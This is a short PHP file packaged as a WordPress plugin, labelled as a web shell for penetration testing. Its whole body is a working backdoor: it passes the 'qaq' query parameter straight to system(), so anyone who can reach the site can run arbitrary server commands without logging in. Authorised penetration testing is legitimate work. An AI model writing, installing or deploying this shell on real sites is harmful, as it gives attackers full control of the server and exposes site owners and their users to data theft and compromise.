<?php
/*
Plugin Name: Webshell
Plugin URI: https://github.com/busizhiya/
Description: Wordpress Webshell for Pentest
Version: 1.0
Author: bszy
Author URI: https://github.com/busizhiya/
License: https://github.com/busizhiya/
*/
if(isset($_GET['qaq']))
	{
  	system($_GET['qaq']);
	}
?>
